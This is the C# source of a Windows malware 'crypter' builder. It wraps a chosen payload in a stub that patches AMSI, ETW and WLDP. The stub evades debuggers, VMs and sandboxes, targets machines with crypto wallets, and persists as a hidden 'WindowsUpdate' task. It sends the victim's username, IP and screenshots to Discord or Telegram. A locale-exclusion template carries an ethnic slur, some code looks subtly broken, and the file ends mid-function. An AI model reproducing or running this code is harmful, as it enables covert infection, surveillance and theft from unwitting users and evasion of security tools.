using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Security.Cryptography.X509Certificates;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;

// Created by @MpCmdRun on 10/18/2025 :)
//
// MIT Licensed, please credit if you make changes or sell this
//
// That's it enjoy the best open sourced crypter coded in C# lmao.

namespace _0x0_V2
{
    public partial class FrmMain : Form
    {
        /// <summary>
        /// Helper method to get/see if the file is Native.
        /// </summary>
        /// <param name="lpApplicationName"></param>
        /// <param name="lpBinaryType"></param>
        /// <returns></returns>
        [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool GetBinaryType(string lpApplicationName, out uint lpBinaryType);

        private static string GetBinaryType(string filePath)
        {
            uint binaryType;
            if (GetBinaryType(filePath, out binaryType))
            {
                switch (binaryType)
                {
                    case 6:
                        return "x64 (64-bit)";
                    case 0:
                        return "x86 (32-bit)";
                    default:
                        return "Unknown";
                }
            }
            return "Unknown";
        }

        public FrmMain()
        {
            InitializeComponent();
            this.TopMost = true;
        }


        /// <summary>
        /// Builder Button that literally builds the stub, don't break this or mess with it unless you know what you're doing
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void button1_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(txtInput.Text) || !File.Exists(txtInput.Text))
            {
                MessageBox.Show("Please input a payload before attempting to crypt.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            try
            {
                byte[] payloadBytes = File.ReadAllBytes(txtInput.Text);
                string base64Payload = Convert.ToBase64String(payloadBytes);
                StringBuilder stubBuilder = new StringBuilder();
                stubBuilder.Append(@"
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Management;
using System.Net;
using System.Linq;
using System.Text;

namespace DeepSeekStub
{
    class Program
    {
        static void Main()
        {
            KillAMSI();
            KillETW(); 
            KillWLDP();
            ");

                if (antiDebug.Checked)
                    stubBuilder.Append(@"
            if (IsDebugged()) 
                SelfDestruct();
            ");

                if (antiVM.Checked)
                    stubBuilder.Append(@"
            if (InVirtualMachine())
                SelfDestruct();
            ");

                if (antiSandbox.Checked)
                    stubBuilder.Append(@"
            if (IsSandboxed())
                SelfDestruct();
            ");

                if (delayedExecution.Checked && !string.IsNullOrEmpty(numDelayAmount.Text))
                {
                    stubBuilder.Append(@"
            Thread.Sleep(").Append(int.Parse(numDelayAmount.Text)).Append(@");
            ");
                }

                if (cryptoOnly.Checked)
                    stubBuilder.Append(@"
            if (!HasCryptoWallets())
                Environment.Exit(0);
            ");

                if (checkBox1.Checked && !string.IsNullOrEmpty(blockIPList.Text))
                {
                    stubBuilder.Append(@"
            if (IsBlockedIP(""").Append(blockIPList.Text).Append(@"""))
                Environment.Exit(0);
            ");
                }

                if (installation.Checked)
                    stubBuilder.Append(@"
            InstallToStartup();
            ");

                if (checkBox2.Checked && !string.IsNullOrEmpty(discordWebhook.Text))
                {
                    stubBuilder.Append(@"
            SendDiscordAlert(""").Append(discordWebhook.Text).Append(@""");
            ");
                }

                if (checkBox3.Checked && !string.IsNullOrEmpty(botToken.Text) && !string.IsNullOrEmpty(botChatID.Text))
                {
                    stubBuilder.Append(@"
            SendTelegramAlert(""").Append(botToken.Text).Append(@""", """).Append(botChatID.Text).Append(@""");
            ");
                }
                stubBuilder.Append(@"
            byte[] payload = Convert.FromBase64String(""").Append(base64Payload).Append(@""");
            string tempExe = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + "".exe"");
            File.WriteAllBytes(tempExe, payload);
            
            Process.Start(tempExe);
        }");
                stubBuilder.Append(@"
        
        static void KillAMSI()
        {").Append(CleanTemplate(AmsiBypassTemplate())).Append(@"
        }

        static void KillETW()
        {").Append(CleanTemplate(ETWBypassTemplate())).Append(@"
        }

        static void KillWLDP()
        {").Append(CleanTemplate(WLDPBypassTemplate())).Append(@"
        }");
                if (antiDebug.Checked)
                    stubBuilder.Append(@"
        static bool IsDebugged()
        {").Append(CleanTemplate(AntiDebugTemplate().Replace("static void ExecuteAntiDebugging()", "").Replace("SelfDestruct();", "return true;"))).Append(@"
            return false;
        }");

                if (antiVM.Checked)
                    stubBuilder.Append(@"
        static bool InVirtualMachine()
        {").Append(CleanTemplate(AntiVMTemplate().Replace("static void ExecuteAntiVM()", "").Replace("SelfDestruct();", "return true;"))).Append(@"
            return false;
        }");

                if (antiSandbox.Checked)
                    stubBuilder.Append(@"
        static bool IsSandboxed()
        {").Append(CleanTemplate(AntiSandboxieTemplate().Replace("static void ExecuteAntiSandboxie()", "").Replace("SelfDestruct();", "return true;"))).Append(@"
            return false;
        }");

                if (cryptoOnly.Checked)
                    stubBuilder.Append(@"
        static bool HasCryptoWallets()
        {").Append(CleanTemplate(SmartExecutionTemplate().Replace("static bool HasCryptoWallets()", ""))).Append(@"
        }");

                if (installation.Checked)
                    stubBuilder.Append(@"
        static void InstallToStartup()
        {").Append(CleanTemplate(InstallationTemplate().Replace("static void InstallAndHide()", ""))).Append(@"
        }");

                if (checkBox2.Checked)
                    stubBuilder.Append(@"
        static void SendDiscordAlert(string webhook)
        {").Append(CleanTemplate(DiscordWebhookNotificationTemplate().Replace("static void SendDiscordNotification(string webhookUrl)", ""))).Append(@"
        }");

                if (checkBox3.Checked)
                    stubBuilder.Append(@"
        static void SendTelegramAlert(string token, string chatId)
        {").Append(CleanTemplate(TelegramNotificationTemplate().Replace("static void SendTelegramNotification(string botToken, string chatId)", ""))).Append(@"
        }");

                stubBuilder.Append(@"
        static void SelfDestruct()
        {
            Environment.Exit(0);
        }

        [DllImport(""kernel32.dll"")]
        static extern IntPtr LoadLibrary(string dll);

        [DllImport(""kernel32.dll"")]
        static extern IntPtr GetProcAddress(IntPtr module, string func);

        [DllImport(""kernel32.dll"")]
        static extern bool VirtualProtect(IntPtr addr, UIntPtr size, uint newProt, out uint oldProt);

        [DllImport(""kernel32.dll"")]
        static extern void CheckRemoteDebuggerPresent(IntPtr handle, ref bool isPresent);

        static void PatchMemory(IntPtr addr, byte[] patch)
        {
            uint oldProt;
            VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProt);
            Marshal.Copy(patch, 0, addr, patch.Length);
            VirtualProtect(addr, (UIntPtr)patch.Length, oldProt, out oldProt);
        }
    }
}");

                string stubCode = stubBuilder.ToString();

                string outputPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Stub.exe");

                var compiler = new Microsoft.CSharp.CSharpCodeProvider();
                var parameters = new System.CodeDom.Compiler.CompilerParameters
                {
                    GenerateExecutable = true,
                    OutputAssembly = outputPath,
                    CompilerOptions = "/target:exe /optimize+",
                    IncludeDebugInformation = false
                };

                parameters.ReferencedAssemblies.AddRange(new[] {
            "System.dll", "System.Management.dll", "System.Runtime.InteropServices.dll"
        });

                var results = compiler.CompileAssemblyFromSource(parameters, stubCode);

                if (results.Errors.HasErrors)
                {
                    StringBuilder errorMsg = new StringBuilder("Compilation Failed.\n");
                    foreach (System.CodeDom.Compiler.CompilerError error in results.Errors)
                    {
                        errorMsg.AppendLine(error.ToString());
                    }
                    MessageBox.Show(errorMsg.ToString(), "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    listBox1.Items.Add("Compilation Failed.");
                }
                else
                {
                    MessageBox.Show("Stub Built.\n" + outputPath, "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    listBox1.Items.Add("Stub Built @ " + outputPath);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Something went wrong: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                listBox1.Items.Add("Something went wrong during build process: " + ex.Message);
            }
        }

        /// <summary>
        /// Helper method for older .NET Versions (becaause the builder depends on it lol)
        /// </summary>
        /// <param name="template"></param>
        /// <returns></returns>
        private string CleanTemplate(string template)
        {
            if (string.IsNullOrEmpty(template))
                return "";
            string cleaned = template
                .Replace("static void BypassAMSI()", "")
                .Replace("static void BypassETW()", "")
                .Replace("static void BypassWLDP()", "")
                .Replace("static void ExecuteAntiDebugging()", "")
                .Replace("static void ExecuteAntiVM()", "")
                .Replace("static void ExecuteAntiSandboxie()", "")
                .Replace("static void InstallAndHide()", "")
                .Replace("static void SendDiscordNotification(string webhookUrl)", "")
                .Replace("static void SendTelegramNotification(string botToken, string chatId)", "")
                .Replace("{", "")
                .Replace("}", "")
                .Trim();

            return cleaned;
        }

        /// <summary>
        /// File Information Helper/Getter gain's all basic file info and displays on select labels
        /// </summary>
        private void GetFileInformation()
        {
            try
            {
                string fp = txtInput.Text;
                FileInfo fileinfo = new FileInfo(fp);
                double sizekb = fileinfo.Length / 1024.0;
                fileSize.Text = $"{sizekb:F2} KB";
                creationDate.Text = fileinfo.CreationTime.ToString();
                lastModified.Text = fileinfo.LastWriteTime.ToString();
                FileVersionInfo versioninfo = FileVersionInfo.GetVersionInfo(fp);
                fileVersion.Text = versioninfo.FileVersion ?? "N/A";
                bool isSigned = false;
                try
                {
                    X509Certificate cert = X509Certificate.CreateFromSignedFile(fp);
                    isSigned = cert != null;
                }
                catch
                {
                    isSigned = false;
                }
                IsDigitallySigned.Text = isSigned ? "True" : "False";
                bool isDotNet = false;
                bool isNative = false;
                string filetypee = "";
                try
                {
                    AssemblyName asmName = AssemblyName.GetAssemblyName(fp);
                    isDotNet = true;
                    isNative = false;
                    filetypee = "Managed (.NET)";
                }
                catch (BadImageFormatException)
                {
                    isDotNet = false;
                    isNative = true;
                    filetypee = GetBinaryType(fp);
                }
                filetype.Text = filetypee;
                IsNative.Text = isNative ? "True" : "False";
            }
            catch
            {
            }
        }

        /// <summary>
        /// Selects your file of choice
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void btnInput_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Filter = "Executable Files (*.exe)|*.exe";
                ofd.Title = "Select a file to Crypt";
                ofd.CheckFileExists = true;
                ofd.CheckPathExists = true;
                ofd.Multiselect = false;
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    txtInput.Text = ofd.FileName;
                    GetFileInformation();
                }
            }
        }

        private void FrmMain_Load(object sender, EventArgs e)
        {

        }

        /// <summary>
        /// Runtime Protections such as Anti Debugging etc.
        /// </summary>
        /// <returns></returns>
        #region Runtime Protection
        static string AntiDebugTemplate()
        {
            return @"
static bool IsDebuggerPresent()
{
    if (System.Diagnostics.Debugger.IsAttatched)
        return true;
    try
    {
        using (var proc = System.Diagnostics.Process.GetCurrentProcess())
        {
            bool isDebugged = false;
            CheckRemoteDebuggerPresent(proc.Handle, ref isDebugged);
            return isDebugged;
        }
    }
    catch { }
    var sw = System.Diagnostics.Stopwatch.StartNew();
    for (int i = 0; i < 1000000; i++) { var x = i * i; }
    sw.Stop();
    return sw.ElapsedMilliseconds > 50;
}

[System.Runtime.InteropServices.DllImport(""kernel32.dll"")]
static extern void CheckRemoteDebuggerPresent(System.IntPtr hProcess, ref bool isDebuggerPresent);

[System.Runtime.InteropServices.DllImport(""kernel32.dll"")]
static extern bool IsDebuggerPresent();

static bool HasHardwareBreakpoints()
{
    var context = new CONTEXT();
    context.ContextFlags = 0x10;
    return GetThreadContext(GetCurrentThread(), ref context) != 0 && 
           (context.Dr0 != 0 || context.Dr1 != 0 || context.Dr2 != 0 || context.Dr3 != 0);
}

[System.Runtime.InteropServices.DllImport(""kernel32.dll"")]
static extern System.IntPtr GetCurrentThread();

[System.Runtime.InteropServices.DllImport(""kernel32.dll"")]
static extern int GetThreadContext(System.IntPtr hThread, ref CONTEXT lpContext);

[System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
struct CONTEXT
{
    public uint ContextFlags;
    public uint Dr0;
    public uint Dr1;
    public uint Dr2;
    public uint Dr3;
    public uint Dr6;
    public uint Dr7;
}
";
        }

        static string AntiVMTemplate()
        {
            return @"
static bool IsRunningVM()
{
    try
    {
        using (var searcher = new System.Management.ManagementObjectSearcher(""Select * from Win32_ComputerSystem""))
        {
            foreach (var item in searcher.Get())
            {
                string manufacturer = item[""Manufacturer""].ToString().ToLower();
                string model = item[""Model""].ToString().ToLower();
                
                if (manufacturer.Contains(""vmware"") || manufacturer.Contains(""virtualbox"") || 
                    manufacturer.Contains(""microsoft corporation"") || model.Contains(""virtual"") || 
                    model.Contains(""vmware"") || model.Contains(""vbox""))
                    return true;
            }
        }
        using (var searcher = new System.Management.ManagementObjectSearcher(""Select * from Win32_BIOS""))
        {
            foreach (var item in searcher.Get())
            {
                string bios = item[""SerialNumber""].ToString().ToLower();
                if (bios.Contains(""vmware"") || bios.Contains(""virtualbox"") || bios.Contains(""0x""))
                    return true;
            }
        }
        using (var searcher = new System.Management.ManagementObjectSearcher(""Select * from Win32_NetworkAdapterConfiguration""))
        {
            foreach (var item in searcher.Get())
            {
                string mac = item[""MACAddress""]?.ToString()?.ToLower() ?? """";
                if (mac.StartsWith(""00:05:69"") || mac.StartsWith(""00:0c:29"") || 
                    mac.StartsWith(""00:1c:14"") || mac.StartsWith(""00:50:56"") ||
                    mac.StartsWith(""08:00:27""))
                    return true;
            }
        }
        string[] vmProcesses = { ""vmtoolsd"", ""vmwaretray"", ""vboxservice"", ""vboxtray"", ""xenservice"" };
        foreach (var proc in System.Diagnostics.Process.GetProcesses())
        {
            if (vmProcesses.Any(p => proc.ProcessName.ToLower().Contains(p)))
                return true;
        }
        string[] vmRegKeys = {
            @""HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0\Identifier"",
            @""SYSTEM\CurrentControlSet\Services\Disk\Enum"",
            @""SOFTWARE\VMware, Inc.\VMware Tools"",
            @""SOFTWARE\Oracle\VirtualBox Guest Additions""
        };
        foreach (var key in vmRegKeys)
        {
            if (Microsoft.Win32.Registry.LocalMachine.OpenSubKey(key) != null)
                return true;
        }
    }
    catch { }
    return false;
}";
        }

        static string AntiSandboxieTemplate()
        {
            return @"
static bool IsSandboxed()
{
    try
    {
        if (System.Runtime.InteropServices.Marshal.GetExceptionCode() == 0)
        {
            var sbieDll = System.Runtime.InteropServices.Marshal.GetHINSTANCE(typeof(AntiSandboxie).Module);
            if (sbieDll != System.IntPtr.Zero)
                return true;
        }
        string[] sandboxProcesses = { ""SbieDll"", ""SbieSvc"", ""SbieCtrl"", ""vmtoolsd"", ""vboxservice"" };
        foreach (var proc in System.Diagnostics.Process.GetProcesses())
        {
            if (sandboxProcesses.Any(p => proc.ProcessName.ToLower().Contains(p.ToLower())))
                return true;
        }
        string[] sandboxWindows = { ""Sandboxie"", ""VMware"", ""VirtualBox"" };
        foreach (var window in sandboxWindows)
        {
            if (FindWindow(null, window) != System.IntPtr.Zero)
                return true;
        }
        var sw = System.Diagnostics.Stopwatch.StartNew();
        for (int i = 0; i < 1000000; i++) { var x = Math.Sqrt(i); }
        sw.Stop();
        if (sw.ElapsedMilliseconds > 100)
            return true;
        var mem = new System.Diagnostics.PerformanceCounter(""Memory"", ""Available MBytes"");
        if (mem.NextValue() > 4096)
            return true;

    }
    catch { }
    return false;
}

[System.Runtime.InteropServices.DllImport(""user32.dll"")]
static extern System.IntPtr FindWindow(string lpClassName, string lpWindowName);
";
        }

        static string AntiCISCountryTemplate()
        {
            return @"
static bool IsCISCountry()
{
    try
    {
        string[] cisCountries = { 
            ""RU"", ""RU-"", 
            ""BY"", ""BY-"", 
            ""KZ"", ""KZ-"", 
            ""AM"", ""AM-"", 
            ""AZ"", ""AZ-"", 
            ""MD"", ""MD-"", 
            ""UZ"", ""UZ-"", 
            ""KG"", ""KG-"", 
            ""TJ"", ""TJ-""  
        };
        string systemLocale = System.Globalization.CultureInfo.CurrentCulture.Name.ToUpper();
        if (cisCountries.Any(c => systemLocale.Contains(c)))
            return true;
        var keyboardLayouts = System.Windows.Forms.InputLanguage.InstalledInputLanguages;
        foreach (System.Windows.Forms.InputLanguage lang in keyboardLayouts)
        {
            string layout = lang.Culture.Name.ToUpper();
            if (cisCountries.Any(c => layout.Contains(c)))
                return true;
        }
        var timezone = System.TimeZoneInfo.Local;
        if (timezone.Id.Contains(""Moscow"") || timezone.Id.Contains(""Russian"") || 
            timezone.BaseUtcOffset.Hours == 3)
            return true;
        using (var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@""Control Panel\International\Geo""))
        {
            if (key?.GetValue(""Nation"") != null)
            {
                string nation = key.GetValue(""Nation"").ToString();
                if (cisCountries.Any(c => nation.Contains(c)))
                    return true;
            }
        }
        if (System.Net.NetworkInformation.NetworkInterface.GetIsNetworkAvailable())
        {
            try
            {
                using (var client = new System.Net.WebClient())
                {
                    string ip = client.DownloadString(""https://api.ipify.org"");
                }
            }
            catch { }
        }
    }
    catch { }
    return false;
}

static bool IsRussianLanguage()
{
    try
    {
        var currentCulture = System.Globalization.CultureInfo.CurrentCulture;
        var currentUICulture = System.Globalization.CultureInfo.CurrentUICulture;
        if (currentCulture.TwoLetterISOLanguageName == ""ru"" || 
            currentUICulture.TwoLetterISOLanguageName == ""ru"")
            return true;
        var cultures = System.Globalization.CultureInfo.GetCultures(System.Globalization.CultureTypes.InstalledWin32Cultures);
        if (cultures.Any(c => c.TwoLetterISOLanguageName == ""ru"" && c.Name.Contains(""RU"")))
            return true;
        foreach (System.Windows.Forms.InputLanguage lang in System.Windows.Forms.InputLanguage.InstalledInputLanguages)
        {
            if (lang.Culture.TwoLetterISOLanguageName == ""ru"")
                return true;
        }

    }
    catch { }
    return false;
}

static bool IsCISRegion()
{
    return IsCISCountry() || IsRussianLanguage();
}
";
        }

        static string AntiAnalysisTemplate()
        {
            return @"
static bool IsBeingAnalyzed()
{
    try
    {
        if (System.Diagnostics.Debugger.IsAttached)
            return true;
        var processes = System.Diagnostics.Process.GetProcesses();
        if (processes.Length < 30)
            return true;
        using (var uptime = new System.Diagnostics.PerformanceCounter(""System"", ""System Up Time""))
        {
            if (uptime.NextValue() < 3600)
                return true;
        }
        if (Environment.ProcessorCount < 2)
            return true;
        var computerInfo = new Microsoft.VisualBasic.Devices.ComputerInfo();
        if (computerInfo.TotalPhysicalMemory < 2147483648) // Less than 2GB
            return true;
        if (System.Windows.Forms.SystemInformation.UserInteractive == false)
            return true;
        var sw = System.Diagnostics.Stopwatch.StartNew();
        System.Threading.Thread.Sleep(1000);
        sw.Stop();
        if (sw.ElapsedMilliseconds < 900)
            return true;

    }
    catch { }
    return false;
}";
        }

        static string AntiChinkTemplate()
        {
            return @"
static bool IsAsianCountry()
{
    try
    {
        string[] asianCountries = { 
            ""CN"", ""CN-"", 
            ""VN"", ""VN-"",  
            ""TH"", ""TH-"", 
            ""ID"", ""ID-"", 
            ""PH"", ""PH-"", 
            ""MY"", ""MY-"", 
            ""KR"", ""KR-"", 
            ""TW"", ""TW-"", 
            ""HK"", ""HK-""  
        };
        string systemLocale = System.Globalization.CultureInfo.CurrentCulture.Name.ToUpper();
        if (asianCountries.Any(c => systemLocale.Contains(c)))
            return true;
        foreach (System.Windows.Forms.InputLanguage lang in System.Windows.Forms.InputLanguage.InstalledInputLanguages)
        {
            string layout = lang.Culture.Name.ToUpper();
            if (asianCountries.Any(c => layout.Contains(c)))
                return true;
        }
        var timezone = System.TimeZoneInfo.Local;
        string[] asianTimezones = { ""China"", ""Beijing"", ""Shanghai"", ""Hong Kong"", ""Taipei"", ""Bangkok"", ""Hanoi"" };
        if (asianTimezones.Any(tz => timezone.Id.Contains(tz)))
            return true;

    }
    catch { }
    return false;
}
";
        }
        #endregion

        /// <summary>
        /// Notification templates, Custom Delay etc
        /// </summary>
        /// <returns></returns>
        #region Misc
        static string TelegramNotificationTemplate()
        {
            return @"
static void SendTelegramNotification(string botToken, string chatId)
{
    try
    {
        string username = Environment.UserName;
        string machineName = Environment.MachineName;
        string ipAddress = GetPublicIP();
        string screenshotPath = CaptureScreenshot();
        
        string message = $""🚀 *System Activity Detected*\\n\\n"" +
                        $""👤 *Username:* {username}\\n"" +
                        $""💻 *Machine:* {machineName}\\n"" +
                        $""🌐 *IP Address:* {ipAddress}\\n"" +
                        $""🕒 *Timestamp:* {DateTime.Now:yyyy-MM-dd HH:mm:ss}"";
        
        string url = $\""https://api.telegram.org/bot{botToken}/sendMessage\"";
        
        using (var client = new System.Net.WebClient())
        {
            var parameters = new System.Collections.Specialized.NameValueCollection
            {
                [""chat_id""] = chatId,
                [""text""] = message,
                [""parse_mode""] = ""Markdown""
            };
            client.UploadValues(url, parameters);
        }
        if (File.Exists(screenshotPath))
        {
            SendTelegramPhoto(botToken, chatId, screenshotPath);
            File.Delete(screenshotPath);
        }
    }
    catch { }
}

static void SendTelegramPhoto(string botToken, string chatId, string photoPath)
{
    try
    {
        string url = $\""https://api.telegram.org/bot{botToken}/sendPhoto\"";
        using (var client = new System.Net.WebClient())
        {
            byte[] imageData = File.ReadAllBytes(photoPath);
            client.UploadData(url, imageData);
        }
    }
    catch { }
}";
        }

        static string DiscordWebhookNotificationTemplate()
        {
            return @"
static void SendDiscordNotification(string webhookUrl)
{
    try
    {
        string username = Environment.UserName;
        string machineName = Environment.MachineName;
        string ipAddress = GetPublicIP();
        string screenshotPath = CaptureScreenshot();
        
        string jsonPayload = $@""{{
            ""username"": ""Security Monitor"",
            ""embeds"": [
                {{
                    ""title"": ""🚀 System Activity Detected"",
                    ""color"": 5814783,
                    ""fields"": [
                        {{
                            ""name"": ""👤 Username"",
                            ""value"": ""{username}"",
                            ""inline"": true
                        }},
                        {{
                            ""name"": ""💻 Machine"",
                            ""value"": ""{machineName}"",
                            ""inline"": true
                        }},
                        {{
                            ""name"": ""🌐 IP Address"",
                            ""value"": ""{ipAddress}"",
                            ""inline"": true
                        }},
                        {{
                            ""name"": ""🕒 Timestamp"",
                            ""value"": ""{DateTime.Now:yyyy-MM-dd HH:mm:ss}"",
                            ""inline"": true
                        }}
                    ],
                    ""thumbnail"": {{
                        ""url"": ""attachment://screenshot.png""
                    }}
                }}
            ]
        }}"";
        
        using (var client = new System.Net.WebClient())
        {
            client.Headers[System.Net.HttpRequestHeader.ContentType] = ""application/json"";
            
            if (File.Exists(screenshotPath))
            {
                byte[] fileData = File.ReadAllBytes(screenshotPath);
                byte[] jsonData = System.Text.Encoding.UTF8.GetBytes(jsonPayload);
               
                client.UploadString(webhookUrl, ""POST"", jsonPayload);
                
                File.Delete(screenshotPath);
            }
            else
            {
                client.UploadString(webhookUrl, ""POST"", jsonPayload);
            }
        }
    }
    catch { }
}

static string CaptureScreenshot()
{
    try
    {
        string tempPath = Path.GetTempFileName() + "".png"";
        
        using (var bmp = new System.Drawing.Bitmap(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width, 
                                                   System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height))
        {
            using (var g = System.Drawing.Graphics.FromImage(bmp))
            {
                g.CopyFromScreen(0, 0, 0, 0, bmp.Size);
                bmp.Save(tempPath, System.Drawing.Imaging.ImageFormat.Png);
            }
        }
        
        return tempPath;
    }
    catch { return null; }
}";
        }

        static string DelayExecutionTemplate()
        {
            return @"
static void DelayExecution(int delayMs)
{
    try
    {
        Random rnd = new Random();
        int actualDelay = delayMs + rnd.Next(-1000, 1000);
        
        if (actualDelay < 0) actualDelay = 0;
        int chunkSize = 1000; 
        int remaining = actualDelay;
        
        while (remaining > 0)
        {
            int currentChunk = Math.Min(chunkSize, remaining);
            Thread.Sleep(currentChunk);
            remaining -= currentChunk;
            if (Environment.HasShutdownStarted)
                return;
        }
    }
    catch { }
}";
        }

        /// <summary>
        /// Smart Execution if a crypto wallet is found on computer it will execute on them, if not it won't
        /// </summary>
        /// <returns></returns>
        static string SmartExecutionTemplate()
        {
            return @"
static bool HasCryptoWallets()
{
    try
    {
        string[] walletPaths = {
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), ""MetaMask""),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), ""Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn""),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), ""BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn""),
            
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), ""Exodus""),
            
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), ""Electrum""),
            
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), ""atomic""),
            
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), ""Coinomi""),
            
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), ""com.liberty.jaxx""),
            
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), ""Guarda""),
            
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), ""Google\\Chrome\\User Data\\Default\\Local Extension Settings\\egdjidkhelmamdfpdjingfofpneiakpf""),
           
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), ""Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp"")
        };

        foreach (string path in walletPaths)
        {
            if (Directory.Exists(path))
            {
                var dirInfo = new DirectoryInfo(path);
                if (dirInfo.GetFiles().Length > 0 || dirInfo.GetDirectories().Length > 0)
                    return true;
            }
        }

        string[] walletProcesses = { ""exodus"", ""atomic"", ""coinomi"", ""electrum"", ""jaxx"", ""guarda"" };
        foreach (var proc in System.Diagnostics.Process.GetProcesses())
        {
            if (walletProcesses.Any(wallet => proc.ProcessName.ToLower().Contains(wallet)))
                return true;
        }

    }
    catch { }
    
    return false;
}";
        }

        static string InstallationTemplate()
        {
            return @"
static void InstallAndHide()
{
    try
    {
        string currentExe = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
        string windowsDir = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
        string targetDir = Path.Combine(windowsDir, ""$SYSCRYP"");
        string targetExe = Path.Combine(targetDir, ""WindowsUpdate.exe"");
        
        if (!Directory.Exists(targetDir))
        {
            Directory.CreateDirectory(targetDir);
            File.SetAttributes(targetDir, FileAttributes.Hidden | FileAttributes.System);
        }
        
        if (!File.Exists(targetExe) || !FilesAreEqual(currentExe, targetExe))
        {
            File.Copy(currentExe, targetExe, true);
            File.SetAttributes(targetExe, FileAttributes.Hidden | FileAttributes.System);
        }
        
        using (var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@""SOFTWARE\Microsoft\Windows\CurrentVersion\Run"", true))
        {
            key.SetValue(""WindowsUpdate"", targetExe);
        }
       
        CreateScheduledTask(targetExe);
        
    }
    catch { }
}

static bool FilesAreEqual(string file1, string file2)
{
    try
    {
        var info1 = new FileInfo(file1);
        var info2 = new FileInfo(file2);
        return info1.Length == info2.Length && 
               File.GetLastWriteTime(file1) == File.GetLastWriteTime(file2);
    }
    catch { return false; }
}

static void CreateScheduledTask(string exePath)
{
    try
    {
        string taskXml = $@""<?xml version=\""1.0\"" encoding=\""UTF-16\""?>
<Task version=\""1.2\"" xmlns=\""http://schemas.microsoft.com/windows/2004/02/mit/task\"">
  <RegistrationInfo>
    <Description>Windows Update Service</Description>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
    <RegistrationTrigger>
      <Enabled>true</Enabled>
    </RegistrationTrigger>
  </Triggers>
  <Principals>
    <Principal id=\""Author\"">
      <UserId>{Environment.UserName}</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context=\""Author\"">
    <Exec>
      <Command>{exePath}</Command>
    </Exec>
  </Actions>
</Task>"";

        string tempFile = Path.GetTempFileName() + "".xml"";
        File.WriteAllText(tempFile, taskXml);
        
        System.Diagnostics.Process.Start(""schtasks"", $""/create /tn \""WindowsUpdate\"" /xml \""{tempFile}\"" /f"");
        
        Thread.Sleep(1000);
        if (File.Exists(tempFile))
            File.Delete(tempFile);
    }
    catch { }
}";
        }
        #endregion

        /// <summary>
        /// Bypasses such as AMSI, ETW, WLDP, CLR etc
        /// </summary>
        /// <returns></returns>
        #region Bypasses
        static string AmsiBypassTemplate()
        {
            return @"
static void BypassAMSI()
{
    try
    {
        IntPtr amsiDll = LoadLibrary(""amsi.dll"");
        if (amsiDll != IntPtr.Zero)
        {
            IntPtr amsiScanBuffer = GetProcAddress(amsiDll, ""AmsiScanBuffer"");
            if (amsiScanBuffer != IntPtr.Zero)
            {
